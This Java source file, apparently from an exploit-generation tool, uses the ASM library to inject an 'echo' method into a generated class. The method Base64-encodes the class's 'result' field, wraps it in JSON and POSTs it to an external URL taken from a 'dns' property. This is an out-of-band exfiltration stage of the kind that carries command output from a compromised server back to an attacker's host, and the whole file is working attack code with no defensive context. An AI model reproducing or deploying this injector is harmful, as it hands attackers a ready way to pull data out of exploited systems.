package top.racerz.echo;

import org.objectweb.asm.*;
import top.racerz.utils.StringUtil;

public class OOB implements Opcodes {
    public static void insert(ClassWriter cw, String option) {
        String dns = StringUtil.getCurrentPropertiesValue("dns");
        MethodVisitor mv;

        {
            mv = cw.visitMethod(ACC_PUBLIC, "echo", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            mv.visitLabel(l0);
            mv.visitLineNumber(44, l0);
            mv.visitLdcInsn(dns);
            mv.visitVarInsn(ASTORE, 1);
            Label l1 = new Label();
            mv.visitLabel(l1);
            mv.visitLineNumber(45, l1);
            mv.visitTypeInsn(NEW, "sun/misc/BASE64Encoder");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "sun/misc/BASE64Encoder", "<init>", "()V", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l2 = new Label();
            mv.visitLabel(l2);
            mv.visitLineNumber(46, l2);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitFieldInsn(GETFIELD, option, "result", "Ljava/lang/String;");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "getBytes", "()[B", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "sun/misc/BASE64Encoder", "encode", "([B)Ljava/lang/String;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(47, l3);
            mv.visitTypeInsn(NEW, "java/net/URL");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
            mv.visitVarInsn(ASTORE, 4);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(48, l4);
            mv.visitTypeInsn(NEW, "java/lang/StringBuilder");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitLdcInsn("{\"result\":\"");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn("\"}");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            mv.visitVarInsn(ASTORE, 5);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(49, l5);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/URL", "openConnection", "()Ljava/net/URLConnection;", false);
            mv.visitTypeInsn(CHECKCAST, "java/net/HttpURLConnection");
            mv.visitVarInsn(ASTORE, 6);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(50, l6);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitLdcInsn("Content-Type");
            mv.visitLdcInsn("application/json");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", false);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(51, l7);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setDoOutput", "(Z)V", false);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(52, l8);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitLdcInsn("Content-Length");
            mv.visitVarInsn(ALOAD, 5);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "length", "()I", false);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/String", "valueOf", "(I)Ljava/lang/String;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", false);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(53, l9);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitIntInsn(SIPUSH, 2000);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setConnectTimeout", "(I)V", false);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(54, l10);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitIntInsn(SIPUSH, 5000);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setReadTimeout", "(I)V", false);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(55, l11);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "getOutputStream", "()Ljava/io/OutputStream;", false);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "getBytes", "()[B", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/OutputStream", "write", "([B)V", false);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLineNumber(56, l12);
            mv.visitTypeInsn(NEW, "java/io/BufferedReader");
            mv.visitInsn(DUP);
            mv.visitTypeInsn(NEW, "java/io/InputStreamReader");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "getInputStream", "()Ljava/io/InputStream;", false);
            mv.visitFieldInsn(GETSTATIC, "java/nio/charset/StandardCharsets", "UTF_8", "Ljava/nio/charset/Charset;");
            mv.visitMethodInsn(INVOKESPECIAL, "java/io/InputStreamReader", "<init>", "(Ljava/io/InputStream;Ljava/nio/charset/Charset;)V", false);
            mv.visitMethodInsn(INVOKESPECIAL, "java/io/BufferedReader", "<init>", "(Ljava/io/Reader;)V", false);
            mv.visitVarInsn(ASTORE, 7);
            Label l13 = new Label();
            mv.visitLabel(l13);
            mv.visitLineNumber(57, l13);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/BufferedReader", "close", "()V", false);
            Label l14 = new Label();
            mv.visitLabel(l14);
            mv.visitLineNumber(58, l14);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "disconnect", "()V", false);
            Label l15 = new Label();
            mv.visitLabel(l15);
            mv.visitLineNumber(59, l15);
            mv.visitInsn(RETURN);
            Label l16 = new Label();
            mv.visitLabel(l16);
            mv.visitLocalVariable("this", "L" + option + ";", null, l0, l16, 0);
            mv.visitLocalVariable("target", "Ljava/lang/String;", null, l1, l16, 1);
            mv.visitLocalVariable("encoder", "Lsun/misc/BASE64Encoder;", null, l2, l16, 2);
            mv.visitLocalVariable("encodeResult", "Ljava/lang/String;", null, l3, l16, 3);
            mv.visitLocalVariable("url", "Ljava/net/URL;", null, l4, l16, 4);
            mv.visitLocalVariable("body", "Ljava/lang/String;", null, l5, l16, 5);
            mv.visitLocalVariable("connection", "Ljava/net/HttpURLConnection;", null, l6, l16, 6);
            mv.visitLocalVariable("in", "Ljava/io/BufferedReader;", null, l13, l16, 7);
            mv.visitMaxs(6, 8);
            mv.visitEnd();
        }
    }
}
